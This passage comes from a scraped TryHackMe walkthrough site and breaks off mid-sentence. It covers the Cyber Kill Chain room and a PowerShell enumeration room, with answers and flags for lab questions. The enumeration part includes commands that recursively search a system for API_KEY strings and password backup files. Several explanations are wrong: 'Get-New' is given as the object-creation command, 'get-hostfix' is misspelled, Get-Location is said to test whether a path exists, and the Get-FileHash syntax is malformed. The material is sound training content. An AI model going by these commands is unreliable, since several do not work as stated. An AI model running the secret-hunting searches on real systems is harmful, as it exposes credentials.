reconnaissance. OSINT is the first step an attacker needs to complete to carry out the further phases of an attack. The attacker needs to study the victim by collecting every available piece of information on the company and its employees, such as the company's size, email addresses, phone numbers from publicly available resources to determine the best target for the attack. You can also find out more about OSINT from this Varonis article, \"What is OSINT ?\" Let's look at it from the attacker's perspective, who initially doesn't know what company he wants to attack. Here is the scenario: A malicious attacker who names himself \"Megatron\" decides to conduct a very sophisticated attack that he has been planning out for years; he has been studying and researching different tools and techniques that could help him get to the last phase of the Cyber Kill Chain. But first, he needs to start from the Reconnaissance phase. In order to operate in this phase, the attacker would need to conduct OSINT . Let's have a look at Email harvesting. Email harvesting is the process of obtaining email addressesfrom public, paid, or free services. An attacker can use email-address harvesting for a phishing attack (a type of social-engineering attack used to steal sensitive data, including login credentials and credit card numbers). The attacker will have a big arsenal of tools available for reconnaissance purposes. Here are some of them: theHarvester - other than gathering emails, this tool is also capable of gathering names, subdomains, IPs, and URLs using multiple public data sources Hunter.io - this is an email hunting tool that will let you obtain contact information associated with the domain OSINT Framework - OSINT Framework provides the collection of OSINT tools based on various categories An attacker would also use social media websites such as LinkedIn, Facebook, Twitter, and Instagram to collect information on a specific victim he would want to attack or the company. The information found on social media can be beneficial for an attacker to conduct a phishing attack. List of the questions solved Question: What is the name of the Intel Gathering Tool that is a web-based interface to the common tools and resources for open-source intelligence? OSINT Framework Question: What is the definition for the email gathering process during the stage of reconnaissance? Email harvesting","title":"Task 2: Reconnaissance"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-3-weaponization","text":"Weaponization After a successful reconnaissance stage, \"Megatron\" would work on crafting a \"weapon of destruction\". He would prefer not to interact with the victim directly and, instead, he will create a \"weaponizer\" that, according to Lockheed Martin, combines malware and exploit into a deliverable payload . Most attackers usually use automated tools to generate the malware or refer to the DarkWeb to purchase the malware. More sophisticated actors or nation-sponsored APT (Advanced Persistent Threat Groups) would write their custom malware to make the malware sample unique and evade detection on the target. Let's first define some terminology before we analyze the Weaponization phase. Malware is a program or software that is designed to damage, disrupt, or gain unauthorized access to a computer. An exploit is a program or a code that takes advantage of the vulnerability or flaw in the application or system. A payload is a malicious code that the attacker runs on the system. Continuing with our adversary, \"Megatron\" chooses... \"Megatron\" chooses to buy an already written payload from someone else in the DarkWeb, so that he can spend more time on the other phases. In the Weaponization phase, the attacker would: Create an infected Microsoft Office document containing a malicious macro or VBA (Visual Basic for Applications) scripts. If you want to learn about macro and VBA, please refer to the article \"Intro to Macros and VBA For Script Kiddies\" by TrustedSec . An attacker can create a malicious payload or a very sophisticated worm, implant it on the USB drives, and then distribute them in public. An example of the virus. An attacker would choose Command and Control (C2) techniques for executing the commands on the victim's machine or deliver more payloads. You can read more about the C2 techniques on MITRE ATT&CK . An attacker would select a backdoor implant (the way to access the computer system, which includes bypassing the security mechanisms). List of the questions solved Question: This term is referred to as a group of commands that perform a specific task. You can think of them as subroutines or functions that contain the code that most users use to automate routine tasks. But malicious actors tend to use them for malicious purposes and include them in Microsoft Office documents. Can you provide the term for it? macro","title":"Task 3: Weaponization"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-4-delivery","text":"Delivery The Delivery phase is when \"Megatron\" decides to choose the method for transmitting the payload or the malware. He has plenty of options to choose from: Phishing email: after conducting the reconnaissance and determining the targets for the attack, the malicious actor would craft a malicious email that would target either a specific person (spearphishing attack) or multiple people in the company. The email would contain a payload or malware. For example, \"Megatron\" would learn that Nancy from the Sales department at company A would constantly like the posts on LinkedIn from Scott, a Service Delivery Manager at company B. He would give it a second guess that they both communicate with each other over work emails. \"Megatron\" would craft an email using Scott's First Name and Last Name, making the domain look similar to the company Scott is working at. An attacker would then send a fake \"Invoice\" email to Nancy, which contains the payload. Distributing infected USB drives in public places like coffee shops, parking lots, or on the street. An attacker might decide to conduct a sophisticated USB Drop Attack by printing the company's logo on the USB drives and mailing them to the company while pretending to be a customer sending the USB devices as a gift. You can read about one of these similar attacks at CSO Online \"Cybercriminal group mails malicious USB dongles to targeted companies.\" Watering hole attack. A watering hole attack is a targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker's choice. The attacker would look for a known vulnerability for the website and try to exploit it. The attacker would encourage the victims to visit the website by sending \"harmless\" emails pointing out the malicious URL to make the attack work more efficiently. After visiting the website, the victim would unintentionally download malware or a malicious application to their computer. This type of attack is called a drive-by download. An example can be a malicious pop-up asking to download a fake Browser extension. List of the questions solved Question: What is the name of the attack when it is performed against a specific group of people, and the attacker seeks to infect the website that the mentioned group of people is constantly visiting. Watering hole attack","title":"Task 4: Delivery"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-5-exploitation","text":"Exploitation To gain access to the system, an attacker needs to exploit the vulnerability. In this phase, \"Megatron\" got a little bit creative - he created two phishing emails, one that contains a phishing link to a fake Office 365 login page and another one containing a macro attachment that would execute ransomware when the victim opens it. \"Megatron\" successfully delivered his exploits and got two victims to click on the malicious link and open the malicious file. After gaining access to the system, the malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network. According to CrowdStrike , lateral movement refers to the techniques that a malicious actor uses after gaining initial access to the victim's machine to move deeper into a network to obtain sensitive data. If you want to learn more about server-based or web-based vulnerabilities, please refer to the TryHackMe room OWASP Top 10 . The attacker might also apply a \"Zero-day Exploit\" in this stage. According to FireEye , \"the zero-day exploit or a zero-day vulnerability is an unknown exploit in the wild that exposes a vulnerability in software or hardware and can create complicated problems well before anyone realizes something is wrong. A zero-day exploit leaves NO opportunity for detection at the beginning.\" These are examples of how an attacker carries out exploitation: The victim triggers the exploit by opening the email attachment or clicking on a malicious link. Using a zero-day exploit. Exploit software, hardware, or even human vulnerabilities. An attacker triggers the exploit for server-based vulnerabilities. List of the questions solved Question: Can you provide the name for a cyberattack targeting a software vulnerability that is unknown to the antivirus or software vendors? zero-day","title":"Task 5: Exploitation"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-6-installation","text":"Installation As you have learned from the Weaponization phase, the backdoor lets an attacker bypass security measures and hide the access. A backdoor is also known as an access point. Once the attacker gets access to the system, he would want to reaccess the system if he loses the connection to it or if he got detected and got the initial access removed, or if the system is later patched. He will no longer have access to it. That is when the attacker needs to install a persistent backdoor . A persistent backdoor will let the attacker access the system he compromised in the past. You can check out the Windows Persistence Room on TryHackMe to learn how an attacker can achieve persistence on Windows. The persistence can be achieved through: Installing a web shell on the webserver. A web shell is a malicious script written in web development programming languages such as ASP, PHP, or JSP used by an attacker to maintain access to the compromised system. Because of the web shell simplicity and file formatting (.php, .asp, .aspx, .jsp, etc.) can be difficult to detect and might be classified as benign. You may check out this great article released by Microsoft on various web shell attacks. Installing a backdoor on the victim's machine. For example, the attacker can use Meterpreter to install a backdoor on the victim's machine. Meterpreter is a Metasploit Framework payload that gives an interactive shell from which an attacker can interact with the victim's machine remotely and execute the malicious code. Creating or modifying Windows services. This technique is known as T1543.003 on MITRE ATT&CK (MITRE ATT&CK\u00ae is a knowledge base of adversary tactics and techniques based on real-world scenarios). An attacker can create or modify the Windows services to execute the malicious scripts or payloads regularly as a part of the persistence. An attacker can use the tools like sc.exe (sc.exe lets you Create, Start, Stop, Query, or Delete any Windows Service) and Reg to modify service configurations. The attacker can also masquerade the malicious payload by using a service name that is known to be related to the Operating System or legitimate software. Adding the entry to the \"run keys\" for the malicious payload in the Registry or the Startup Folder. By doing that, the payload will execute each time the user logs in on the computer. According to MITRE ATT&CK, there is a startup folder location for individual user accounts and a system-wide startup folder that will be checked no matter what user account logs in. You can read more about the Registry Run Keys / Startup Folder persistence on one of the MITRE ATT&CK techniques . In this phase, the attacker can also use the Timestomping technique to avoid detection by the forensic investigator and also to make the malware appear as a part of a legitimate program. The Timestomping technique lets an attacker modify the file's timestamps, including the modify, access, create and change times. List of the questions solved Question: Can you provide the technique used to modify file time attributes to hide new or changes to existing files? Timestomping Question: Can you name the malicious script planted by an attacker on the webserver to maintain access to the compromised system and enables the webserver to be accessed remotely? web shell","title":"Task 6: Installation"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-7-command-control","text":"Command & Control After getting persistence and executing the malware on the victim's machine, \"Megatron\" opens up the C2 (Command and Control) channel through the malware to remotely control and manipulate the victim. This term is also known as C&C or C2 Beaconing as a type of malicious communication between a C&C server and malware on the infected host. The infected host will consistently communicate with the C2 server; that is also where the beaconing term came from. The compromised endpoint would communicate with an external server set up by an attacker to establish a command & control channel. After establishing the connection, the attacker has full control of the victim's machine. Until recently, IRC (Internet Relay Chat) was the traditional C2 channel used by attackers. This is no longer the case, as modern security solutions can easily detect malicious IRC traffic. The most common C2 channels used by adversaries nowadays: The protocols HTTP on port 80 and HTTPS on port 443 - this type of beaconing blends the malicious traffic with the legitimate traffic and can help the attacker evade firewalls. DNS (Domain Name Server). The infected machine makes constant DNS requests to the DNS server that belongs to an attacker, this type of C2 communication is also known as DNS Tunneling. Important to note that an adversary or another compromised host can be the owner of the C2 infrastructure. List of the questions solved Question: What is the C2 communication where the victim makes regular DNS requests to a DNS server and domain which belong to an attacker. DNS Tunneling","title":"Task 7: Command &amp; Control"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-8-actions-on-objectives-exfiltration","text":"Exfiltration After going through six phases of the attack, \"Megatron\" can finally achieve his goals, which means taking action on the original objectives. With hands-on keyboard access, the attacker can achieve the following: Collect the credentials from users. Perform privilege escalation (gaining elevated access like domain administrator access from a workstation by exploiting the misconfiguration). Internal reconnaissance (for example, an attacker gets to interact with internal software to find its vulnerabilities). Lateral movement through the company's environment. Collect and exfiltrate sensitive data. Deleting the backups and shadow copies. Shadow Copy is a Microsoft technology that can create backup copies, snapshots of computer files, or volumes. Overwrite or corrupt data. List of the questions solved Question: Can you provide a technology included in Microsoft Windows that can create backup copies or snapshots of files or volumes on the computer, even when they are in use? Shadow Copy","title":"Task 8: Actions on Objectives (Exfiltration)"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-9-practice-analysis","text":"We really hope you enjoyed this room. In order to strengthen your knowledge, let's do a practice analysis. Here is the real-world scenario for you to tackle: The infamous Target cyber-attack, which led to one of the largest data breaches in history took place on November 27, 2013. On December 19th, 2013, Target released a statement confirming the breach, stating that approximately 40 million credit and debit card accounts were impacted between Nov. 27 and Dec. 15, 2013. Target had to pay the fine of $18.5 million under the terms of the multistate settlement agreement. This is considered to be the largest data-breach settlement in history. How did the data breach happen? Deploy the static site attached to this task and apply your skills to build the Cyber Kill Chain of this scenario. Here are some tips to help you complete the practical: Add each item on the list in the correct Kill Chain entry-form on the Static Site Lab: exploit public-facing application data from local system powershell dynamic linker hijacking spearphishing attachment fallback channels Use the \u2018Check answers\u2019 button to verify whether the answers are correct (where wrong answers will be underlined in red). List of the questions solved Question: What is the flag after you complete the static site? THM{7HR347_1N73L_12_4w35om3} Cyber kill chain","title":"Task 9: Practice Analysis"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-10-conclusion","text":"Cyber Kill Chain can be a great tool to improve network defence. Is it perfect and can it be the only tool to rely on? No. The traditional Cyber Kill Chain or Lockheed Martin Cyber Kill Chain was last modified in 2011, which, if you remember, is the date of its establishment. The absence of updates and modifications creates security gaps. The traditional Cyber Kill Chain was designed to secure the network perimeter and protect against malware threats. But the cybersecurity threats have developed drastically nowadays, and adversaries are combining multiple TTP (tactics, techniques, and procedures) to achieve their goal. Adversaries are capable of defeating threat intelligence by modifying the file hashes and IP addresses. Security solutions companies are developing technologies like AI (Artificial Intelligence) and different algorithms to detect even slight and suspicious changes. Since the main focus of the framework is on malware delivery and network security, the traditional Cyber Kill Chain will not be able to identify Insider Threats. According to CISA , \"The Insider Threat is the potential for an insider to use their authorized access or understanding of an organization to harm that organization.\" We recommend not only relying on the traditional Cyber Kill Chain model but also referring to MITRE ATT&CK as well as Unified Kill Chain to apply a more comprehensive approach to your defence methodologies.","title":"Task 10: Conclusion"},{"location":"tryhackme/room/l/hacking-with-powershell/","tags":["THM-Room"],"text":"TryHackMe - Hacking with Powershell - Walkthrough \u00b6 Task 1: Objectives \u00b6 Content Before completing this room, you should be aware of some fundamentals. For example, the differences between CMD, PS and some syntax. This room will cover the following: What is Powershell Basic Powershell commands Windows enumeration skills Powershell scripting Answer the questions below Read the above and deploy the machine! No answer needed Task 2: What is Powershell? \u00b6 Content Powershell is the Windows Scripting Language and shell environment built using the .NET framework. This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object-oriented. This also means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun ; for example, the cmdlet to list commands is called Get-Command Common verbs to use include: Get Start Stop Read Write New Out To get the complete list of approved verbs, visit this link. Answer the questions below What is the command to get a new object? Get-New To see the usage of a cmdlet we use the syntax Get-Help + <name of cmdlet> -Examples . For example, we want to see the usage of the Get-Command[^2] command, we use the Get-Help Get-Command -Examples syntax. See picture bellow. Image title This pic describes how to use the Get-Command command syntax Task 3: Basic Powershell Commands \u00b6 Content Now that we've understood how cmdlets work - let's explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends! Using Get-Help \u00b6 Get-Help displays information about a cmdlet. To get help with a particular command, run the following: Get-Help Command-Name You can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following: Running the Get-Help cmdlet to explain a command PS C :\\ Users \\ Administrator > Get-Help Get-Command -Examples NAME Get-Command SYNOPSIS Gets all commands . Example 1 : Get cmdlets , functions , and aliases PS C :\\> Get-Command Using Get-Command \u00b6 Get-Command gets all the cmdlets installed on the current Computer. The great thing about this cmdlet is that it allows for pattern matching like the following Get-Command Verb-* or Get-Command *-Noun Running Get-Command New-* to view all the cmdlets for the verb new displays the following: Using the Get-Command to list all cmdlets installed PS C :\\ Users \\ Administrator > Get-Command New -* CommandType Name Version Source ----------- ---- ------- ------ Alias New-AWSCredentials 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2FlowLogs 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2Hosts 3 . 3 . 563 . 1 AWSPowerShell Alias New-RSTags 3 . 3 . 563 . 1 AWSPowerShell Alias New-SGTapes 3 . 3 . 563 . 1 AWSPowerShell Function New-AutologgerConfig 1 . 0 . 0 . 0 EventTracingManagement Function New-DAEntryPointTableItem 1 . 0 . 0 . 0 DirectAccessClientComponents Function New-DscChecksum 1 . 1 PSDesiredStateConfiguration Function New-EapConfiguration 2 . 0 . 0 . 0 VpnClient Function New-EtwTraceSession 1 . 0 . 0 . 0 EventTracingManagement Function New-FileShare 2 . 0 . 0 . 0 Storage Function New-Fixture 3 . 4 . 0 Pester Function New-Guid 3 . 1 . 0 . 0 Microsoft . PowerShell . Utility - -cropped for brevity -- Object Manipulation \u00b6 In the previous task, we saw how the output of every cmdlet is an object. If we want to manipulate the output, we need to figure out a few things: passing the output to other cmdlets using specific object cmdlets to extract information The Pipeline( | ) is used to pass output from one cmdlet to another. A major difference compared to other shells is that Powershell passes an object to the next cmdlet instead of passing text or string to the command after the pipe. Like every object in object-oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet, and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet: Verb-Noun | Get-Member An example of running this to view the members for Get-Command is: Get-Command | Get-Member -MemberType Method Using pipe (|) to pass output from one cmdlet to another PS C :\\ Users \\ Administrator > Get-Command | Get-Member -MemberType Method TypeName : System . Management . Automation . AliasInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () TypeName : System . Management . Automation . FunctionInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () TypeName : System . Management . Automation . CmdletInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () PS C :\\ Users \\ Administrator > From the above flag in the command, you can see that you can also select between methods and properties. Creating Objects From Previous cmdlets \u00b6 One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. Here's an example of listing the directories and just selecting the mode and the name: Listing the directories and filtering via mode and name PS C :\\ Users \\ Administrator > Get-ChildItem | Select-Object -Property Mode , Name Mode Name ---- ---- d-r --- Contacts d-r --- Desktop d-r --- Documents d-r --- Downloads d-r --- Favorites d-r --- Links d-r --- Music d-r --- Pictures d-r --- Saved Games d-r --- Searches d-r --- Videos PS C :\\ Users \\ Administrator > You can also use the following flags to select particular information: first - gets the first x object last - gets the last x object unique - shows the unique objects skip - skips x objects Filtering Objects \u00b6 When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. The general format for using this cmdlet is Verb-Noun | Where-Object -Property PropertyName -operator Value Verb-Noun | Where-Object {$_.PropertyName -operator Value} The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet . Powershell is quite sensitive, so don't put quotes around the command! Where -operator is a list of the following operators: -Contains : if any item in the property value is an exact match for the specified value -EQ : if the property value is the same as the specified value -GT : if the property value is greater than the specified value For a full list of operators, use this link. Here's an example of checking the stopped processes: Demonstrating the use of operators only to show stopped services PS C :\\ Users \\ Administrator > Get-Service | Where-Object -Property Status -eq Stopped Status Name DisplayName ------ ---- ----------- Stopped AJRouter AllJoyn Router Service Stopped ALG Application Layer Gateway Service Stopped AppIDSvc Application Identity Stopped AppMgmt Application Management Stopped AppReadiness App Readiness Stopped AppVClient Microsoft App-V Client Stopped AppXSvc AppX Deployment Service ( AppXSVC ) Stopped AudioEndpointBu ... Windows Audio Endpoint Builder Stopped Audiosrv Windows Audio Stopped AxInstSV ActiveX Installer ( AxInstSV ) Stopped BITS Background Intelligent Transfer Ser ... Stopped Browser Computer Browser Stopped bthserv Bluetooth Support Service -- cropped for brevity -- Sort-Object \u00b6 When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe-lining the output of a cmdlet to the Sort-Object cmdlet . The format of the command would be: Verb-Noun | Sort-Object Here's an example of sorting the list of directories: Using the Sort-Object cmdlet to sort piped information PS C :\\ Users \\ Administrator > Get-ChildItem | Sort-Object Directory : C :\\ Users \\ Administrator Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r --- 10 / 3 / 2019 5 : 11 PM Contacts d-r --- 10 / 5 / 2019 2 : 38 PM Desktop d-r --- 10 / 3 / 2019 10 : 55 PM Documents d-r --- 10 / 3 / 2019 11 : 51 PM Downloads d-r --- 10 / 3 / 2019 5 : 11 PM Favorites d-r --- 10 / 3 / 2019 5 : 11 PM Links d-r --- 10 / 3 / 2019 5 : 11 PM Music d-r --- 10 / 3 / 2019 5 : 11 PM Pictures d-r --- 10 / 3 / 2019 5 : 11 PM Saved Games d-r --- 10 / 3 / 2019 5 : 11 PM Searches d-r --- 10 / 3 / 2019 5 : 11 PM Videos PS C :\\ Users \\ Administrator > Now that you've understood how Powershell works let's try some commands to apply this knowledge! Answer the questions below What is the location of the file \"interesting-file.txt\" Answer Explain C :\\ Program Files To find the file interesting-file.txt we will scan the directory with the following command: Get-ChildItem -Path D :\\ -Include * interesting -file *. txt -File -Recurse -ErrorAction SilentlyContinue I will explain the flags: Flag -Path: Specify the path to scan Flag -Include: Specify the file to scan (You can use the * operator to specify to find files whose filename includes the string between the two * operators we have set.) Flag -File: Specify only file Flag -Recurse: Recursive search Flag -ErrorAction SilentlyContinue: Ignore error Specify the contents of this file Answer Explain notsointerestingcontent To view content of file, you can use: 1 . Get-Content -Path + path_of_file 2 . More + path_of_file How many cmdlets are installed on the system(only cmdlets, not functions and aliases)? Answer Explain 6638 First of all, you must know all functions and cmdlets on the system by listing them. Use Get-Commnad . You see that the output consists of 4 columns in order: CommandType, Name, Version, Source. Focus at CommandType to filter. Second, filter the results to find the number of cmdlets by: Where-Object -Property CommandType -like Cmdlet . Ye, you have filtered out all cmdlets on the system. Last, let's count them by Measure command Image title The image describes the result Get the MD5 hash of interesting-file.txt Answer Explain 49A586A2A9456226F8A1B4CEC6FAB329 To get hash of file, you can use Get-FileHash + -Algorithm -MD5. The full syntax to solve this question is: Get-FileHash C :\\ 'Program Files' \\ interesting -file . txt . txt -Algorithm -MD5 What is the command to get the current working directory? Answer Explain Get-Location To get the current working directory, you will use Get-Location command. Furthermore, you can use Get-LocalUser command to computer show up all user in computer. Does the path \"C:\\Users\\Administrator\\Documents\\Passwords\" Exist (Y/N)? Answer Explain N Like the previous scenario, we will use Get-Location + path to check if the working directory exists or not. Full syntax: Get-Location C :\\ Users \\ Administrator \\ Documents \\ Passwords Image title The image describes the result What command would you use to make a request to a web server? Answer Explain Invoke-WebRequest Search google or find in all cmdlets on the system by filtering as follows: Find all cmdlets and funtions by Get-Command command Filter to get cmdlets which itself has one and keywords like call, request,... in the name by Where-Object -Property Name -like *request* . You will see Invoke-WebRequest command in results. Base64 decode the file b64.txt on Windows. Answer Explain ihopeyoudidthisonwindows To showup this question, use Certutil command with flag decode. Besides, Certutil command also has some useful flags: encode: encode according to base64 decodehex: decode according to hexadecimal View more at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil Full step: Certutil -decode b64.txt output.txt Get-Content output.txt PS C :\\ Users \\ Administrator \\ Desktop > certutil -decode .\\ b64 . txt a . txt Input Length = 432 Output Length = 323 CertUtil : -decode command completed successfully . PS C :\\ Users \\ Administrator \\ Desktop > Get-Content a . txt this is the flag - ihopeyoudidthisonwindows the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage Task 4: Enumeration \u00b6 Content The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following: users basic networking information file permissions registry permissions scheduled and running tasks insecure files Your task will be to answer the following questions to enumerate the machine using Powershell commands! Answer the questions below How many users are there on the machine? Answer Explain 5 Use Get-LocalUser command which I explained at What is the command to get the current working directory? question Which local user does this SID(S-1-5-21-1394777289-3961777894-1791813945-501) belong to? Answer Explain Guest Use Get-LocalUser | Select * command to showup full property. Then, filter output and get results. PS C :\\ Users \\ Administrator \\ Desktop > get-localuser | select * | where-object sid -like * 501 * AccountExpires : Description : Built-in account for guest access to the computer / domain Enabled : False FullName : PasswordChangeableDate : PasswordExpires : UserMayChangePassword : False PasswordRequired : False PasswordLastSet : LastLogon : Name : Guest SID : S - 1 - 5 - 21 - 1394777289 - 3961777894 - 1791813945 - 501 PrincipalSource : Local ObjectClass : User How many users have their password required values set to False? Answer Explain 4 Filter, filter, filter,... PS C :\\ Users \\ Administrator \\ Desktop > get-localuser | select * | where-object passwordrequired -match false | measure Count : 4 Average : Sum : Maximum : Minimum : Property : How many local groups exist? Answer Explain 24 Use get-command | where name -like *group* | where name -like *local* to file cmdlet, and filter then. PS C :\\ Users \\ Administrator \\ Desktop > get-command | where-object name -like * group * | where-object name -like * local * CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Add-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet New-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Rename-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Set-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts PS C :\\ Users \\ Administrator \\ Desktop > get-command | where name -like * group * | where name -like * local * CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Add-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet New-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Rename-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Set-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts PS C :\\ Users \\ Administrator \\ Desktop > get-localgroup Name Description ---- ----------- Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission ... Administrators Administrators have complete and unrestricted access to the computer / domain Backup Operators Backup Operators can override security restrictions for the sole purpose of back ... Certificate Service DCOM Access Members of this group are allowed to connect to Certification Authorities in the ... Cryptographic Operators Members are authorized to perform cryptographic operations . Distributed COM Users Members are allowed to launch , activate and use Distributed COM objects on this ... Event Log Readers Members of this group can read event logs from local machine Guests Guests have the same access as members of the Users group by default , except for ... Hyper-V Administrators Members of this group have complete and unrestricted access to all features of H ... IIS_IUSRS Built-in group used by Internet Information Services . Network Configuration Operators Members in this group can have some administrative privileges to manage configur ... Performance Log Users Members of this group may schedule logging of performance counters , enable trace ... Performance Monitor Users Members of this group can access performance counter data locally and remotely Power Users Power Users are included for backwards compatibility and possess limited adminis ... Print Operators Members can administer printers installed on domain controllers RDS Endpoint Servers Servers in this group run virtual machines and host sessions where users RemoteA ... RDS Management Servers Servers in this group can perform routine administrative actions on servers runn ... RDS Remote Access Servers Servers in this group enable users of RemoteApp programs and personal virtual de ... Remote Desktop Users Members in this group are granted the right to logon remotely Remote Management Users Members of this group can access WMI resources over management protocols ( such a ... Replicator Supports file replication in a domain Storage Replica Administrators Members of this group have complete and unrestricted access to all features of S ... System Managed Accounts Group Members of this group are managed by the system . Users Users are prevented from making accidental or intentional system-wide changes an ... PS C :\\ Users \\ Administrator \\ Desktop > get-localgroup | measure Count : 24 Average : Sum : Maximum : Minimum : Property : What command did you use to get the IP address info? Answer Explain Get-NetIPAddress Use Get-Command | Where-Object -property name -like \"*ip*\" | where-object -property Name -like \"*address*\" to find cmdlets. How many ports are listed as listening? Answer Explain 20 Use this command: get-nettcpconnection | where state -match listen | measure What is the remote address of the local port listening on port 445? Answer Explain :: Use this command: get-nettcpconnection | where localport -match 445 How many patches have been applied? Answer Explain 20 Use this command: get-hostfix When was the patch with ID KB4023834 installed? Answer Explain 6 / 15 / 2017 12 : 00 : 00 AM Use this command: get-hostfix | where hostfixID -match KB4023834 Find the contents of a backup file. Answer Explain backpassflag First, you must find backup (in window, it has the extension .bak ). Find it by get-childitem -path C:\\ -include *.bak* -file -recurse -erroraction silentlycontinue Second, read it PS C :\\ Users \\ Administrator > more 'C:\\Program Files (x86)\\Internet Explorer\\passwords.bak.txt' backpassflag Search for all files containing API_KEY Answer Explain fakekey123 Use this command to solve: get-childitem -path c :\\* -recurse -erroraction silentlycontinue | select-string -pattern API_KEY What command do you do to list all the running processes? Answer Explain Get-Process Find cmdlet by using get-command command and filter What is the path of the scheduled task called new-sched-task? Answer Explain / Find command that it provides schedule task: get-command | where name -like *schedule* . You will see get-scheduledtask , this is the command to look for. Then, filter output and get result. PS C :\\ Users \\ Administrator > get-scheduledtask | where taskname -like * new * TaskPath TaskName State -------- -------- ----- \\ new-sched -task Ready Who is the owner of the C:\\? Answer Explain NT SERVICE \\ TrustedInstaller To get owner of X (path_of_folder/path_of_file), use Get-Acl command . Full syntax to solve: PS C :\\ Users \\ Administrator \\ Desktop > get-acl C :\\ Directory : Path Owner Access ---- ----- ------ C :\\ NT SERVICE \\ TrustedInstaller CREATOR OWNER Allow 268435456 ... Task 5: Basic Scripting Challenge \u00b6 Now that we have run Powershell commands, let's try to write and run a script to do more complex and powerful actions. For this ask, we'll use Powershell ISE (the Powershell Text Editor). Let's use a particular scenario to show an example of this script. Given a list of port numbers, we want to use this list to see if the local port is listening. Open the listening-ports.ps1 script on the Desktop using Powershell ISE. Powershell scripts usually have the .ps1 file extension. $system_ports = Get-NetTCPConnection -State Listen $text_port = Get-Content -Path C :\\ Users \\ Administrator \\ Desktop \\ ports . txt foreach ( $port in $text_port ){ if ( $port -in $system_ports . LocalPort ){ echo $port } } On the first line, we want to get a list of all the ports on the system that are listening. We do this using the Get-NetTCPConnection cmdlet. We are then saving the output of this cmdlet into a variable. The convention to create variables is used as: $variable_name = value In the following line, we want to read a list of ports from the file. We do this using the Get-Content cmdlet. Again, we store this output in the variables. The simplest next step is to iterate through all the ports in the file to see if the ports are listening. To iterate through the ports in the file, we use the following: foreach ( $new_var in $existing_var ){} This particular code block is used to loop through a set of objects. Once we have each individual port, we want to check if this port occurs in the listening local ports. Instead of doing another for loop, we just use an if statement with the -in operator to check if the port exists in the LocalPort property of any object. A full list of if statement comparison operators can be found here. To run the script, call the script path using Powershell or click the green button on Powershell ISE: Image title Now that we've seen what a basic script looks like - it's time to write one of your own. The emails folder on the Desktop contains copies of the emails John, Martha, and Mary have been sending to each other(and themselves). Answer the following questions with regard to these emails (try not to open the files and use a script to answer the questions). Scripting may be a bit difficult, 